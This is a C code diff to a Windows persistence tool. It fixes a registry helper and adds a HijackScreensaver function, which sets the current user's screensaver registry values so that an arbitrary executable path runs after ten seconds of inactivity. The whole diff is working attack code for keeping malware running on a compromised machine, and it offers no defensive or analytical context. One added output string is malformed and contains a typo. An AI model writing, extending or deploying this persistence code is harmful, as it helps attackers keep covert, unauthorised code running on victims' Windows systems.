@@ -44,7 +44,9 @@ BOOL ModifyRegistry(PPERS_CONTEXT pPc) {
         return FALSE;
     }
 
-    printf("[+] Registry value successfully set\n");
+    printf("[+] Registry value successfully set to %s -- %s\n", pPc->regKey, pPc->valueName);
+    RegCloseKey(hKey);
+    return TRUE;
 }
 
 BOOL InjectRunRegistry(PPERS_CONTEXT pPc) {
@@ -103,6 +105,26 @@ cleanup:
     free(pPc->valueName);
 
 	return rc;
+}
+
+BOOL HijackScreensaver(PPERS_CONTEXT pPc) {
+    HKEY hKey = NULL;
+    const char *timeout = "10";
+    const char *activate = "1";
+
+    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Control Panel\\Desktop", 0, KEY_WRITE, &hKey);
+    if (res == ERROR_SUCCESS) {
+        // create new registry keys
+        RegSetValueEx(hKey, (LPCSTR)"ScreenSaveActive", 0, REG_SZ, (unsigned char*)activate, strlen(activate));
+        RegSetValueEx(hKey, (LPCSTR)"ScreenSaveTimeOut", 0, REG_SZ, (unsigned char*)timeout, strlen(timeout));
+        RegSetValueEx(hKey, (LPCSTR)"SCRNSAVE.EXE", 0, REG_SZ, (unsigned char*)pPc->targetPath, pPc->targetPathLen);
+        RegCloseKey(hKey);
+        printf("[+] Registry \"Control Panel\\\"Desktop modified successfuly");
+    } else {
+        TranslateErrorPrint(GetLastError());
+        return FALSE;
+    }
+    return TRUE;
 }
 
 #endif // PERS_H
